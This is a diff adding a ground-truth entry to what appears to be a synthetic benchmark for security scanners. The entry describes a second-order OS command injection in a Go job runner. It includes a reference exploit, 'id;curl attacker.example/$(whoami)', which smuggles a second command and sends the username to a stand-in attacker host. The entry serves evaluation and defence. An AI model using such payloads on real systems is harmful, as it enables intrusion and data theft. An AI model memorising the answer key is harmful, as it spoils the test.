@@ -1,0 +1,26 @@
+id: gt-455
+source_project: synthetic-phase30
+commit_hash: synthetic-no-commit
+cwe_id: CWE-78
+cwe_name: OS Command Injection
+label: true_positive
+affected_files:
+- eval/synthetic/phase30/advanced/gt-455.go
+line_numbers:
+- 13
+taint_source: cmd passed to SaveJob()
+taint_sink: exec.Command(...).Run()
+taint_path:
+- the attacker stores a crafted shell command through SaveJob()
+- the application persists the attacker-controlled command string in the jobs map
+- RunJob(id) loads the stored command by identifier
+- exec.Command("sh", "-c", cmd).Run() executes the stored attacker-controlled command
+complexity: multi_step
+exploitable: true
+reference_exploit: Save cmd=id;curl attacker.example/$(whoami) and later trigger RunJob(id).
+reference_fix_commit: null
+notes: Second-order command injection through stored job definitions.
+discovery_method: synthetic
+language: go
+framework: go
+taint_step_count: 4
